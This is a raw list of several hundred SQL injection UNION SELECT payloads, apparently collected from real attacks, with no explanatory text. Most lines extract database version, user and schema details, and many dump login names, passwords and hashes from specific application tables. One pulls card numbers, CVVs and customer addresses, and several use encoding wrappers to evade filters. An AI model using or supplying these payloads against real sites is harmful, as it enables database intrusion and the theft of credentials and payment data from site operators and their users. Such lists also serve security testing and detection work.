"-1 union select 1,2,version(),4,5,database(),7,8,9,10,11,12,user(),14,15,16,17,18,19,20,21/*"
"-1 UNION SELECT 1,2,version(),4,5 FROM information_schema.tables"
"-1 union select 1,2,version(),4,table_name,6,7,8 from information_schema.tables limit 24,1"
"-1 UNION SELECT 1,2,version(),concat(id,0x3a,username,0x3a,password),5,6,7,8 from users limit 0,1/*"
"-1 union select 1,2,version(),user()/*"
"1 union select 1,2,version(),user(),5,6,7,8,database(),10--"
"-1 union select 1,2,version(),user(),5,6,7,database(),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37"
"-1 union select 1,2,version(),user(),5,6,database(),8/*"
"-1 union select 1,2,version(),user(),5,database(),7,8,9"
"-1 union select 1,2,version(),user(),database(),6,7,8,9,10,11,12/*"
"-1 union select 1,2,'xekme',4,5,6 from mysql.user--"
"-1 union select 1,,3,4,null,6,7,8,9,10,11 from urls"
"-1 union select 1,4,3,4,5,concat(version(),0x3a,user(),0x3a,database()),7,8,9,10,11,12,13,14,15,16"
"-1 UNION SELECT 1,AES_DECRYPT(AES_ENCRYPT(CONCAT(0x7873716C696E6A626567696E,(SELECT CONCAT(user_id,0x7873716C696E6A64656C,email,0x7873716C696E6A64656C,pass,0x7873716C696E6A64656C,first_name) FROM sbl.users LIMIT 11,1),0x7873716C696E6A656E64),0x71),0x71)/*"
"1 UNION SELECT 1,AES_DECRYPT(AES_ENCRYPT(CONCAT(0x7873716C696E6A626567696E,Version(),0x2F2A2A2F,Database(),0x2F2A2A2F,User(),0x7873716C696E6A656E64),0x71),0x71),3"
"-1 UNION SELECT 1,AES_DECRYPT(AES_ENCRYPT(CONCAT(0x7873716C696E6A626567696E,Version(),0x2F2A2A2F,Database(),0x2F2A2A2F,User(),0x7873716C696E6A656E64),0x71),0x71),3,4,5,6,7,8,9--"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(concat(converge_pass_hash,char(58),converge_pass_salt),0x78),0x78) from ibf_members_converge limit 0,1/*"
"-1' union select 1,AES_DECRYPT(AES_ENCRYPT(concat(email_user,0x3a,password),0x75),0x75) from us"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(concat(user,0x3a,password),0x00),0x00),3,4,5,6,7,8,9,10,11,12,13,14,15,16 from mysql.user limit 3,1/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(concat_ws(0x3a,user(),database(),version()),0x7a),0x7a),3,4,5,6,7,8,9,10,11,12 from mysql.user/*"
"-1 union select 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,user(),version(),database()),0x71),0x71),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/*"
"-1 union select 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,version(),database(),user()),0x71),0x71),3,4/*"
"1 UNION SELECT 1,AES_DECRYPT(AES_ENCRYPT(CONCAT_WS(0x3a,Version(),Database(),User()),0x71),0x71),3,4,5"
"-1 union select 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,version(),database(),user()),0x71),0x71),3,4,5,6--"
"1 union select 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,version(),database(),user()),0x71),0x71),3,4,5,6,7--"
"-1 union select 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,version(),database(),user()),0x71),0x71),3,4,5,6,7,8,9,10/*"
"1' union select 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,Version(),Database(),User()),0x71),0x71),3,4,5 limit 1,1/*"
"1 UNION SELECT 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,version(),database(),user()),0x71),0x71),3,4 LIMIT 1,1/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(concat_ws(0x3b,user(),database(),version()),0x71),0x71),3,4,5,6,7,8,9,10,11,12,13,14/*"
"1 union select 1,AES_DECRYPT(AES_ENCRYPT(convert(concat_ws(0x3a,version(),database(),user()) using cp1251),0x71),0x71),3,4,5,6,7,8,9/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(table_name,0x71),0x71),3,4,5,6,7,8,9,0,1,2,3,4 from information_schema.tables limit 18,1/*"
"1 union select 1,AES_DECRYPT( AES_ENCRYPT(user(),0x71),0x71),3,4,5,6,7,8,9/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(user(),0x71),0x71),3,4,5,6,7,8,9,10/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(USER(),0x71),0x71),3,4,5,6,7,8,9,AES_DECRYPT(AES_ENCRYPT(VERSION(),0x71),0x71),AES_DECRYPT(AES_ENCRYPT(DATABASE(),0x71),0x71),12,13/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(user(),0x71),0x71),3,4,5,AES_DECRYPT(AES_ENCRYPT(version(),0x71),0x71),AES_DECRYPT(AES_ENCRYPT(database(),0x71),0x71)/*"
"-1 union select 1,aes_decrypt(aes_encrypt(user,0x71),0x71),3,aes_decrypt(aes_encrypt(password,0x71),0x71),5,6,7 from mysql.user/*"
"-1 union select 1,aes_decrypt(aes_encrypt(usr,0x71),0x71),3,4 from ssp_usrs limit 1,1--"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(version(),0x17),0x17),3,4 from users/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(version(),0x71),0x71),3,4,5,6,7,8,9,10,11,12,13,14,15/*"
"-1 union select 1,AES_DECRYPT(AES_ENCRYPT(version(),0x71),0x71),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 from users --"
"-1 union select 1,banner,1 from v$version--"
"1 union select 1,char(72,97,99,107,101,100,32,98,121,32,91,32,99,97,115,104,32,93),3,4,5,6,7/*"
"-1 union select 1,column_name,3,4,5,6 from information_schema.columns where table_name=0x457368705f6d656d62657273--"
"-1 union select 1,column_name,3,4,5,6 from information_schema.columns where table_name=char(102,111,114,117,109,95,97,99,99,101,115,115) limit 0,1--"
"-1 union select 1,column_name,3,4 from information_schema.columns limit 80,1#"
"1 union select 1,concat(0x2a,version(),user(),database()),3,4,5 limit 1,1/*"
"1 union select 1,concat(0x2,version(),user(),database()),3,4,5,6,7/*"
"1 union select 1,concat(0x2,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15"
"1' union select 1,concat(0x3a3a,unhex(hex(username)),0x3a3a,unhex(hex(password))),3,4,5,6 from _verwaltung.tbl_user limit 1,3/*"
"-1 union select 1,concat(0x3a,user,pass),3,4,5,6 from admin--"
"-1 union select 1,concat(0x3a,user(),version(),database()),3,4,5,6,7,8,9--"
"-1 union select 1,concat(0x3a,version(),0x3a,database())"
"-1 UNION SELECT 1,CONCAT(0x3a,Version(),0x3a,Database(),0x3a,User())/*"
"1 union select 1,concat(0x3a,version(),0x3a,user(),0x3a,database(),0x3a),3,4,5--"
"1 union select 1,concat(0x3a,version(),0x3a,user(),0x3a,database(),0x3a),3,4,5,6,7,8,9--"
"1 union select 1,concat(0x3a,version(),0x3a,user(),0x3a,database(),0x3a),3,4,5,6,7,8,9,10--"
"1 union select 1,concat(0x3,password,database(),version(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from mysql.user"
"-1 UNION SELECT 1,CONCAT(0x6472385F3838777777333371,concat(column_name),0x686874666638385F363632),3,4,5,6,7 FROM information_schema.columns where table_name='clients' limit 1,1/*"
"-1 UNION SELECT 1,CONCAT(admin_name,pwd),3,4 FROM auction.sbauctions_admin--"
"-1 union select 1,concat(a_name,0x3a,a_psword,0x3a,a_level,0x3a,fixuser,0x3a,fixtime) from cn_admin limit 0,1/*"
"-1' union select 1,concat(char(58,58,58),table_schema,char(46),table_name,char(58,58,58)),3,4,5,6,7,8,9,10,11 from information_schema.tables/*"
"-1 union select 1,concat(client,char(58),phone),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from request limit 0,1/*"
"-1 union select 1,concat(cmslogin,0x3a,cmspwd),3,4 FROM tbl_cms--"
"-1 UNION SELECT 1,concat(DATABASE(),0x3a,USER(),0x3a,VERSION()),3,4--"
"-1 union select 1,concat(database(),0x3a,user(),0x3a,version()),3,4,5,6,7,8,9,10 --"
"-1 union select 1,concat(database(),0x3a,user(),0x3a,version()),3,4,5,6,7,8,9,10,11 --"
"-1 union select 1,concat(database(),0x3a,user(),0x3a,version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/*"
"-1 union select 1,concat(database(),char(58),user())/*"
"-1 union select 1,concat(database(),char(58),user(),char(58),version())/*"
"-1 union select 1,concat(database(),char(58),user(),char(58),version()),3/*"
"-1 union select 1,concat(database(),char(58),user(),char(58),version()),3,4,5,6,7,8,9,10,11,12,13/*"
"-1 union select 1,concat(database(),char(58),user(),char(58),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/*"
"-1 union select 1,concat(database(),char(58),user(),char(58),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26/*"
"-1 union select 1,concat(database(),version(),user())--"
"-1 union select 1,concat(email,0x3a,pass),3,4 from clients/*"
"-1 union select 1,concat(email,0x3a,pass),3,4 from cpAccounts where level=3/*"
"-1 union select 1,concat(email,0x3a,pass),3 from kpro_user/*"
"-1 union select 1,concat(email,0x3a,passwd),3,4,5,6,7 from users limit 0,1/*"
"-1 union select 1,concat(email,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from user limit 0,1/*"
"1 union select 1,ConCat(email,Char(58),password),3,4,5,6,7,8 FROM prgp_user LIMIT 0,1 --"
"-1 union select 1,concat(FName,0x3e,password),3  from admin--"
"1 union select 1,concat(id,0x3a,password,0x3a,email),3 from users/*"
"-1 union select 1,concat(id,0x3a,User,0x3a,Password),3,4,5,6,7,8,9,10,11,12,13,14,15 from AdminUsers--"
"-1 union select 1,concat(id,char(58),name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from autors limit 21,1/*"
"-1 union select 1,concat(id,char(58),namek,char(58),t),3 from tom_tabless limit 0,1/*"
"-1 union select 1,concat(login,0x26,password),3 from members/*"
"-1 union select 1,concat(login,0x3a,pass,0x3a,email),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 from users limit 1,1/*"
"-1 union select 1,concat(login,0x3a,pass),concat(user(),database(),version()),4,5,6,7,8,9,10,11,12,13,14,15 from kv_adminusers"
"-1 union select 1,concat(LOGIN,0x3a,PASS) from kapital_zed_users limit 0,1--"
"-1 union select 1,concat(login,0x3a,password),3,4,5,6 from users--"
"1 union select 1,concat(login,0x3a,password),3,4,5,6 from yasonua_top.users--"
"-1 uniOn Select 1,concat(login,0x3a,password) from ssrusers--"
"-1 union select 1,concat(login,char(58),user_password),3,4,5,6 from users --"
"-1 union select 1,concat(name,0x3a3a,member_login_key),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from ibf_members limit 0,10/*"
"-1 union select 1,concat(name,0x7c,pass,0x7c,id,0x3c62723e),3,4 from specavia.users --"
"-1 union select 1,concat(name,char(13),pass),3,4,5,6,7,8,9 from users limit 1,1--"
"-1 union select 1,concat(name,char(58),email),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from user/*"
"-1 union select 1,concat(name,char(58),email,char(58),pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from autors/*"
"-1 union select 1,concat(name,char(58),pass),3,4,5,6,7,8,9,10,11,12,13 from user/*"
"-1 union select 1,concat(name,char(58),password),3,4,5 from users/*"
"-1 union select 1,concat(name,char(58),pwd) from user/*"
"1 UNION SELECT 1,concat(newsid,0x3a3a3a,newstext),3,4 from im_news/*"
"-1 union select 1,concat(nickname,0x3a,pass),3,4,5,6,7 from tbl_user --"
"1' union select 1,concat(oprname,0x3a3a,pwd,0x3a3a,prvLevel),3,4,5 from church.church_users limit 0,10/*"
"-1 union select 1,concat(table_name,0x20,column_name,0x20,table_schema) from information_schema.columns limit 177,200"
"-1 UNION SELECT 1,concat(table_name,0x3a,column_name) FROM information_schema.columns/*"
"-1 union select 1,concat(table_name),3 from information_schema.tables/*"
"-1 union select 1,concat(table_schema,0x3a,table_name,0x3a,column_name),3,4,5,6,7,8,9 from information_schema.columns where column_name LIKE /**/0x257061737325/**/--"
"-1 UNION SELECT 1,concat(user(),0x3a,database(),0x2a,version()),3,4/*"
"-1 union select 1,concat(user(),0x3a,database(),0x3a,version()),3,4,5--"
"1 union select 1,concat(user(),0x3a,database(),0x3a,version()),3,4,5,6,7--"
"-1)) union select 1,concat(user(),0x3a,database(),0x3a,version()),3,4,5,6,7,8,9,10,11 --"
"-1 union select 1,concat(user(),0x3a,database(),0x3a,version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/*"
"-1 union select 1,concat(user,0x3a,pass),3,4,5 from userlist--"
"-1 union select 1,concat(user,0x3a,pass),5,6,5 from login/*"
"-1 union select 1,concat(user,0x3a,password,0x3a,file_priv),3,4,5,6,7,8,9,10 from mysql.user--"
"1 union select 1,concat(user,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,24,25,26,27,28,29 from mysql.user LIMIT 1,6/*"
"1 union select 1,Concat(user,0x3a,password),3,4,5,6,7,8,9,10 from mysql.user--"
"-1 union select 1,concat(user,0x3a,password),3,4,5,6,7,8 from mysql.user limit 1,1--"
"-1 union select 1,concat(user,0x3a,password),3,4 from mysql.user/*"
"1 union select 1,concat(user,0x3a,password),3 from mysql.user--"
"-1 union select 1,concat(user(),0x3a,version(),0x3a,database()),3/*"
"-1 union select 1,concat(user(),0x3a,version(),0x3a,database()),3,4,5/*"
"-1 union select 1,concat(user(),0x3a,version(),0x3a,database()),3,4,5,6,7 --"
"-1 union select 1,concat(user(),0x3a,version(),0x3a,database()),3,4,5,6,7,8--"
"-1 union select 1,concat(user(),0x3a,version(),0x3a,database()),3,4,5,6,7,8/*"
"-1 union select 1,concat(USER(),0x3a,VERSION(),0x3a,DATABASE()),3,4,5,6,7,8,9,10,11,12/*"
"-1 union select 1,concat(user(),0x3a,version()),3,4,5,6 from user/*"
"-1 union select 1,concat(USER(),0x3a,VERSION()),3,4,5 from mysql.user limit 0,1/*"
"-1 union select 1,concat(user(),0x3b,database()),3,convert(version(),char),5,6,7,8,9/*"
"-1 union select 1,concat(user(),0x81,version(),0x81,database()),3,4,5,6,7,8--"
"-1 UNION SELECT 1,concat(user(),char(32,32),0x6861636b206279205b2063617368205d)/*"
"1' union select 1,concat(user(),char(  58),database(),char(58),version()),3,4,5,6,7,8,9,1  0,11,12/*"
"1' union select 1,concat(user(),char(58),database(),char(58),version()),3,4,5,6,7,8,9,10,11,12/*"
"-1 union select 1,concat(user(),char(58),database()),version(),44,55,66,77/*"
"1 union select 1,concat(user,char(58),password),3,4,5,6,7,8,concat_ws(char(58),user(),version(),database()) from mysql.user/*"
"-1 union select 1,concat(user,char(58),password),3,4,5,6 from mysql.user limit 0,1/*"
"1 union select 1,concat(user,char(58),password) from mysql.user/*"
"-1 UNION SELECT 1,concat(user(),CHAR(58),VERSION()),3,4,5,6/*"
"-1 union select 1,concat(user(),char(58),version(),char(58),database()),3,4,5,6,7,8,9,10,11,12,13 /*"
"-1 union select 1,concat(user(),char(58),version(),char(58),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20/*"
"-1 union select 1,concat(user(),database(),version()),3,4,5,6,7,8 from information_schema.tables--"
"-1 union select 1,concat(user_id,0x3a,user_password),3,4,5 from phpbb_users/*"
"-1 union select 1,concat(username,0x2f2f2f2f,password),3,4 from administration--"
"-1' union select 1,concat(username,0x2F,password),3,4,5,6,7,8,9,10,11,12,13 from dokeos_main.user limit 0,1/*"
"-1 union select 1,concat(username,0x3a,passwd,0x3a,email),3,4,5,6,7,8,9,10,11,12,13,14,15 from user limit 101,1/*"
"-1 union select 1,concat(username,0x3a,passwd),3,4 from user/*"
"-1 union select 1,concat(username,0x3a,password,0x3a,email),3,4,city from users limit 31000,31001/*"
"-1/**/union/**/select/**/1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from jos_users limit 1,1--"
"-1 union select 1,concat(username,0x3a,password),3,4,5,6,7 from admin limit 1,1/*"
"-1 UNION SELECT 1,concat(username,0x3a,password),3,4,5,6,7 FROM users--"
"-1 union select 1,concat(username,0x3a,password),3,4,5,6,Database(),8,9,0,1,12,3,4,5,6,7,8,9,0,1,22,3,4,5,6,7,8,9,0,1,32,3,4,5,6,7,8,9,0,41 from user limit 0,1--"
"-1' union select 1,concat(username,0x3a,password),icq,4,5,6,7,convert(concat(user(),0x3,version(),0x3,database()) using latin1),9,10,11,12 from user limit 1,2/*"
"-1 union select 1,concat(user_name,0x3a,user_email,0x3a,user_password),3,4,5,6,7 from 4images_users--"
"-1' union select 1,concat(username,0x3a,user_password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from rnr_forum_users limit 1,1/*"
"-1 union select 1,concat(user_name,0x3a,user_password),3,4,5,6,7,8,9,10,11,12,13,14,15  from e107_user--"
"-1'union select 1,concat(user_name,0x3a,user_password),3,4,5 from administrators--"
"1 union select 1,concat(username,0x3a,user_password),3,4 from users/*"
"-1 union select 1,concat(username,0x3,password),3,4,5,6,7,8 from users limit 0,1--"
"-1 union select 1,concat(username,char(58),password),3,4,5,6,7 from users/*"
"-1 union select 1,ConCat(username,Char(58),password) FROM users LIMIT 0,1 --"
"-1 union select 1,concat(username,char(58),user_password),3 from phpbb_users limi"
"-1 union select 1,concat(username,char(58),userpwd),3,4 from users/*"
"-1 union select 1,concat(username,char(58),version(),database()),3,4,5,6,7,8 from user/*"
"-1 union select 1,concat(user,password,host),3,4,5,6,7,8,9,10,11,12,13,concat(USER(),VERSION(),DATABASE()),15,16 FROM mysql.user/*"
"-1 union select 1,concat(version(),0x20,database(),0x20,user()),3,4--"
"-1 union select 1,concat(version(),0x2F,database(),0x2F,user()),3,4/*"
"-1 union select 1,concat(version(),0x2F,database(),0x2F,user()),3,4,1,1,1,1,1,1,1,1,1,1,1,1/*"
"-1 union select 1,concat(version(),0x2F,database(),0x2F,user()),3,4,5,6,7,8,9,10/*"
"-1' union select 1,concat(version(),0x2F,user()),3,4,5/*"
"-1 union select 1,concat(version(),0x3a,database(),0x3a,user()),3,4,5,6,7 --"
"-1 union select 1,concat(version(),0x3a,database(),0x3a,user()),3,4,5,6,7/*"
"-1 union select 1,concat(version(),0x3a,user(),0x3a,database())/*"
"1 union select 1,concat(version(),0x3a,user(),0x3a,database())"
"-1 union select 1,concat(version(),0x3a,user(),0x3a,database()),3/*"
"-1 union select 1,concat(version(),0x3a,user(),0x3a,database()),3,4--"
"-1 union select 1,concat(version(),0x3a,user(),0x3a  ,database()),3,4,5,6/*"
"-1 union select 1,concat(version(),0x3a,user(),0x3a,database()),3,4,5,6/*"
"1' union select 1,concat(version(),0x3a,user(),0x3a,database()),3,4,5,6,7,8,9/*"
"-1' union select 1,concat(version(),0x3,user(),0x3,database()),3,4,5,6,7,8/*"
"1 union select 1,concat(version(),char(58,58),database(),char(58,58),user())/*"
"1 union select 1,concat(version(),char(58,58),database(),char(58,58),user()),3/*"
"-1 union select 1,concat(version(),char(58,58),database(),char(58,58),user()),3,4,5,6,7,8,9,10,11,12,13/*"
"-1 union select 1,concat(version(),char(58),database(),char(58),user()),3,4,5,6,7,8,9,10--"
"-1 union select 1,concat(version(),char(58),user(),char(58),database())--"
"-1 union select 1,concat(version(),char(58),user(),char(58),database()),3,4/*"
"-1 UNION SELECT 1,concat(VERSION(),char(58),USER(),char(58),DATABASE()),3,4,5,6,7,8,9,10,11/*"
"-1 union select 1,concat(version(),char(58),user(),char(58),database()),3,777,5/*"
"-1' union select 1,concat(version(),':',database(),':',user()),3,4,5--"
"-1 union select 1,concat(version(),database(),user()),3,4,5,6,7/*"
"-1' union select 1,concat(version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15 order by '1'='1"
"-1 union select 1,concat(version(),database(),user(),@@version_compile_os),3,4--"
"-1) union select 1,concat_ws(0x05,version(),database(),user()),3/*"
"-1 union select 1,concat_ws(0x05,version(),database(),user()),3,4/*"
"-1' UNION SELECT 1,concat_ws(0x0b,@@version_compile_os,version()),3,4,5,6--"
"-1 union select 1,concat_ws(0x0b,version(),user(),database()),3,4,5,6"
"1 UNION SELECT 1,concat_ws(0x202f20,user(),version(),database()),3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES --"
"-1 union select 1,concat_ws(0x203a20,user(),version(),database()),3,4,5,6,7,8,9--"
"-1 union select 1,concat_ws(0x203a20,version(),database(),user(),@@version_compile_os),3--"
"-1 union select 1,concat_ws(0x20,id,user_name,password,email),3,4,5,6,7,8,9,10,11 from members--"
"-1' union select 1,concat_ws(0x20,version(),database(),user())--"
"1 union select 1,concat_ws(0x2a,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3/*"
"-1) union select 1,concat_ws(0x2F,version(),database(),user()),3/*"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3,4/*"
"-1' union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5/*"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7/*"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8/*"
"-1' union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8/*"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9/*"
"-1' union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9/*"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9,10/*"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9,10,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/*"
"-1 UNION SELECT 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9,10,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/*"
"-1' union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9,10,11,12/*"
"-1 union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13/*"
"-1 union select 1,concat_ws(0x2F,version(),database (),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21/*"
"-1 union select 1,concat_ws(0x2f,version(),user(),database())/*"
"-1 union select 1,  concat_ws(0x2f,version(),user(),database()),3,4,5/*"
"-1 union select 1,concat_ws(0x2f,version(),user(),database()),3,4,5,6/*"
"-1 union select 1,concat_ws(0x2f,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25/*"
"1 union select 1,concat_ws(0x2,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13/*"
"1 union select 1,concat_ws(0x2,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13 limit 1,1"
"1 union select 1,concat_ws(0x2,version(),user(),database()),3,4,5 limit 1,1"
"-1 union select 1,concat_ws(0x3a,0x3a,user(),0x3a,database(),0x3a,version(),0x3a,0x3a)/*"
"1 union select 1,concat_ws(0x3a3a3a,id,username,password),3,4 from users --"
"-1 union select 1,concat_ws(0x3a3a3a,userid,password,email,superuser),3,4,5,6,7,8,9,10 from readplus_login--"
"-1 union select 1,concat_ws(0x3a3a3a,version(),database(),user()),3--"
"-1 union select 1,concat_ws(0x3a3a3a,version(),database(),user()),3,4--"
"-1 union select 1,concat_ws(0x3a3a3a,version(),database(),user()),3,4,5,6,7,8,9,10--"
"-1 union select 1,concat_ws(0x3a3a,aid,pwd),3,4,5,6,7,8,9 from mpn_authors --"
"-1 union select 1,concat_ws(0x3a3a,id,l_user,l_pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from l_admin --"
"-1 union select 1,concat_ws(0x3a3a,id,userid,orderdate,shippingcharge,shippingmethoad,promocodeid,total,grandtotal,ccname,cctype,ccnumber,ccmonth,ccyear,cvv,orderstatus,ispaid,fname,mname,lname,address1,address2,city,state,country,zipcode,day_telephone,evening_telephone,companyname,ship_fname,ship_mname,ship_lname,ship_address1,ship_address2,ship_city,ship_state),3 from ordermaster--"
"-1 union select 1,concat_ws(0x3a3a,name,pass,user),3,4,5,6,7 from users limit 0,1"
"-1 union select 1,concat_ws(0x3a3a,pn_uname,pn_pass,pn_user_icq),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from nuke_users limit 0,1/*"
"-1 union select 1,concat_Ws(0x3a3a,user_id,contact_name,username,password,email_address),3 from ox_users /*"
"-1 union select 1,concat_ws(0x3a3a,userID,username,password,AdministratorRights),3,4 from users where AdministratorRights=1 --"
"-1 UNION SELECT 1,concat_ws(0x3a3a,username,password),3,4,5,6,7,8,9,10 from users--"
"-1 union select 1,concat_ws(0x3a3a,username,passwort,skype,email,wuser_status),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from creative/*"
"-1 union select 1,concat_ws(0x3a3a,user_name,user_password),3,4,5,6,7,8 from users limit 0,10/*"
"-1 union select 1,concat_ws(0x3a3a,user(),version(),database()),3,4--"
"-1 union select 1,concat_ws(0x3a3a,user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/*"
"1' union select 1,concat_ws(0x3a3a,usr_login,usr_senha),3,4 from agnc_usuario limit 1,1/*"
"-1 union Select 1,concat_ws(0x3a3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 --"
"1 union select 1,concat_ws(0x3a3a,version(),user(),database()),3,4 --"
"1' UNION SELECT 1,concat_ws(0x3a3a,version(),user( ),database()),3,4,5,6/*"
"-1 union select 1,concat_ws(0x3a3a,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13 --"
"-1 union select 1,concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os),3,4--"
"-1 union select 1,concat_ws(0x3a,database(),0x3a,user(),0x3a,version()),3/*"
"-1 union select 1,concat_ws(0x3a,database(),user(),version()),3--"
"1 union select 1,concat_ws(0x3a,database(),user(),version()),3,4,5--"
"-1 union select 1,concat_ws(0x3a,database(),user(),version()),3,4,5,6--"
"-1' union select 1,concat_Ws(0x3a,database(),user(),version()),3,4,5,6,7,8,9/*"
"1' union select 1,concat_ws(0x3a,database(),user(),version()),3,4,5,6,7,8,9,10 /*"
"-1 union select 1,concat_ws(0x3a,database(),user(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51--"
"-1 union select 1,concat_ws(0x3a,database(),version(),user()),3--"
"-1 union select 1,concat_ws(0x3a,database(),version(),user()),3,4,5,6,7,8,9 --"
"-1 union select 1,concat_ws(0x3a,database(),version(),user()),3,4,5,6,7,8,9,10,11,12,13--"
"-1' union select 1,concat_ws(0x3a,database(),version(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20/*"
"-1 UNION SELECT 1,concat_ws(0x3a,email,pwd),3,4,5,6 ,7,8,9,10,11,12,13,14,15 from signup--"
